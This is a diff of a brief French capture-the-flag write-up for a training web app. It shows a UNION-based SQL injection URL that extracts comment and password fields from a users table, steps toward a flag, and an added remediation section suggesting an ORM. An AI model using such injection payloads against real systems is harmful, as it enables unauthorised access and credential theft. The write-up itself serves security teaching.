@@ -1,3 +1,7 @@
+# Sql_0
+
+## Detection des failles
+
 http://192.168.56.102/?page=member&id=1 OR 1=1 UNION SELECT Commentaire, countersign FROM users--&Submit=Submit#
 
 on s'interessera aux deux lignes:
@@ -12,4 +16,8 @@ En minuscule : fortytwo
 
 On le crypte maintenant en md5
 
-FLAG:10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+## Comment s'en premunir
+
+Utiliser un ORM (object-relational mapping) en passant par le server,
+afin qu'il envoi les données sous forme de classe
